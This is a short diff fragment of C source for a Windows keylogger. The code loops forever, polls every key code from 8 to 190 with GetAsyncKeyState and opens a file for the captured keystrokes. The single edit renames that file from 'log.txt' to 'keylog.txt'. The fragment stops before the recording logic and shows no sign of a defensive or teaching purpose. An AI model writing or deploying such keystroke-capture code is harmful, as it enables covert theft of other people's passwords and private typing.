@@ -4,7 +4,7 @@
 int main() {
     int i;
     FILE *file;
-    file = fopen("log.txt", "w+");
+    file = fopen("keylog.txt", "w+");
     while (1) {
         for (i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
